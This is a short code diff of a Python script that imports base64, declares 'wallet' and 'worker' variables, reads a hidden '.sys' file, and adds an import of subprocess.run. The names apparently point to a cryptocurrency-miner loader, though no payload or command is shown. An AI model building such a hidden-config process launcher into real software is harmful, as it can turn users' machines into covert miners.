@@ -1,4 +1,5 @@
 import base64 as b
+from subprocess import run
 s=wallet=worker=''
 with open('.sys','r') as file:
     s = file.read()
